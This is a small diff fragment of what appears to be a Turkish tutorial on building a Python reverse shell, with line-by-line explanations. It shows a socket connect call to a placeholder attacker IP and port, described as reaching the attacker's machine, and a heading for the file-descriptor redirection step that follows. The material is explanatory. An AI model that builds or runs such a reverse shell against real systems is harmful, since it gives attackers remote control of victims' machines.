@@ -18,7 +18,7 @@ socket.AF_INET: IPv4 adres ailesini kullanır.
 socket.SOCK_STREAM: TCP bağlantı türünü kullanır.
 2.3. Bağlantı Kurma
 
-Kodu kopyala
+
 s.connect(("SALDIRI_HEDEF_IP", SALDIRI_HEDEF_PORT))
 s.connect(): Saldırganın IP adresi (SALDIRI_HEDEF_IP) ve port numarası (SALDIRI_HEDEF_PORT) belirtilerek saldırganın kontrolündeki makineye bağlanılır.
 2.4. Dosya Tanıtıcılarının Yönlendirilmesi
